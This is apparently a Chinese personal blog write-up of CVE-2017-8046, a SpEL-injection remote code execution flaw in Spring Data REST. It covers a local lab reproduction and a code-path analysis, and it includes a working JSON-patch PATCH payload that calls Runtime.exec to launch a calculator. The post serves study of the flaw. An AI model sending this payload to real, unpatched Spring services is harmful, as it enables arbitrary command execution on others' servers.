---
title: "Spring 漏洞总结"
description: 读书时的碎碎念
date: 2019-02-24T21:14:23+08:00
tags:
    - Security
Categories:
    - security
---



![img](https://77sera.oss-cn-beijing.aliyuncs.com/19-02-24/974875.png)



# Spring Data REST | RCE | CVE-2017-8046

## 漏洞简析

SpEL是独立于spring容器的一个可执行模块。 它使用SpelExpressionParser把字符串解析成表达式，当其中一个方法获取到值之后，表达式就会被执行，getValueType或者setValue会被调用：

```
Expression expr = expressionParser.parseExpression(stringScript);
expr.getValue(); //Execute the code in stringScript
```

通常，SpEL仅限于内部使用并且stringScript会被程序完全控制。 但如果 stringScript是用户可控的话，那么攻击者就可以在有漏洞的服务器上执行任意代码。

即：

```
String stringScript = "T(java.lang.Runtime).getRuntime().exec("+cmd+").x";
```

之后cmd就被执行。

这就是这个Spring Data REST漏洞的基本原理，Spring Data REST把远程输入的数据解析成SpEL表达式，并且将其解析。

## 漏洞复现

使用的项目为 `https://github.com/spring-guides/gs-accessing-data-rest.git` 里面的complete，直接用IDEA导入，并修改pom.xml中版本信息为漏洞版本。 1.5.6.RELEASE，然后导入pom.xml

1. 运行项目

2. 新建一个people对象

   ```
   POST /people HTTP/1.1
   Host: localhost:8080
   User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
   Connection: close
   Content-type: application/json
   Content-Length: 32
   
   {"firstName":"test1","lastName":"test2"}
   ```

3. 发送payload

   ```
   PATCH /people/1 HTTP/1.1
   Host: localhost:8080
   User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
   Accept-Encoding: gzip, deflate
   Connection: close
   Content-Type: application/json-patch+json
   Content-Length: 256
   
   [{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{99,97,108,99}))/lastName", "value": "test" }]
   ```

4. 效果

   ![img](http://77sera.oss-cn-beijing.aliyuncs.com/19-02-24/002851.png)

## 漏洞分析

第一次分析Java框架的洞。

payload:

> [{ “op”: “replace”, “path”: “T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{99,97,108,99}))/lastName”, “value”: “vulhub” }]

首先，客官们先来看看这里

![img](https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/277567.png)

这是函数入口，前三行检测header头和http方法的正确性。

到了return处，会执行一个 applyPatch()方法，跟进

![img](https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/277722.png)

跟进getPatchOperation方法后会发现，它会调用convert方法，跟进

![img](https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/278149.png)

这里可以看到，payload中的op参数值为”replace”，因此实例化了ReplaceOperation类

并且入参的path和value是payload中的参数值。

因此，实际上getPatchOperation方法最后会返回一个XXXOperation类，然后再调用Patch类的apply方法，跟进

![img](https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/278773.png)

我们可以看到 31行调用了 ReplaceOperation的perform方法，跟进

![img](https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/278975.png)

此处调用了setValueOnTarget方法，跟进

![img](https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/279199.png)

setValue方法，但是此时Spel表达式的值已经被替换成了我们的payload，继续跟进

![img](https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/279308.png)

setValue的实现 到了spring-expression包来了，最终在spring-expression包里解析执行了我们的代码，弹出了计算器。

解析运行的原理在之前的简析里有分析。 具体SpEL实现，我也很好奇！这块可以期待我们在Spring框架的SpEL处再见！

谢谢各位客官。